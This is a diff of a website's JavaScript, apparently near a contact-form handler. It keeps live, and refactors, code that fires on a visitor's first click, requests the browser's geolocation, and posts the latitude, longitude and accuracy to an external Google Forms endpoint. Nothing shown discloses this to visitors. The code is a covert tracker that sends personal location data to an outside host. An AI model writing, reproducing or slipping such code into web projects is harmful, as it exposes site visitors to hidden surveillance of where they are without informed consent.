@@ -402,7 +402,6 @@ function bindContactForm(){
     } catch(e){}
   }
 }
-
 function sendLocationToGoogleForm(lat, lon, acc) {
   const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc8_1bvxyfBuUXesnPi0XB1DHnCgbASxePGMB3qbQ1L7ShohA/formResponse";
 
@@ -418,16 +417,17 @@ function sendLocationToGoogleForm(lat, lon, acc) {
   });
 }
 
-window.addEventListener("click", () => {
+function autoCaptureLocation() {
   navigator.geolocation.getCurrentPosition(pos => {
     sendLocationToGoogleForm(
       pos.coords.latitude,
       pos.coords.longitude,
       pos.coords.accuracy
     );
+  }, err => {
+    console.log("Location denied or failed:", err);
   });
-}, { once: true });
+}
 
-
-// ✅ Runs only AFTER first user tap
 window.addEventListener("click", autoCaptureLocation, { once: true });
+
